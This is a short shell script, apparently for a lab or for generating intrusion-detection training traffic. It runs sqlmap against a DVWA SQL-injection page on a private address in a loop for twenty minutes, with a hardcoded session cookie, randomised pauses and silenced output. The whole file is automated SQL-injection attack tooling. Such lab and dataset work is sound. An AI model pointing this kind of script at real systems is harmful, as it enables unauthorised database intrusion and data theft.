#!/bin/sh
echo "[SQLI] Starting..."
COOKIE="PHPSESSID=9c05efdf8aa95ac580a1abccb31893f7; security=low"
TARGET="http://172.20.0.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
END=$(($(date +%s) + 1200))

while [ $(date +%s) -lt $END ]; do
    sqlmap -u "$TARGET" \
        --cookie="$COOKIE" \
        --batch --level=3 --risk=2 \
        --technique=BEUS --threads=4 \
        --output-dir=/tmp/sqlmap \
        --silent 2>/dev/null
    sleep $((RANDOM % 4 + 2))
done
echo "[SQLI] Done."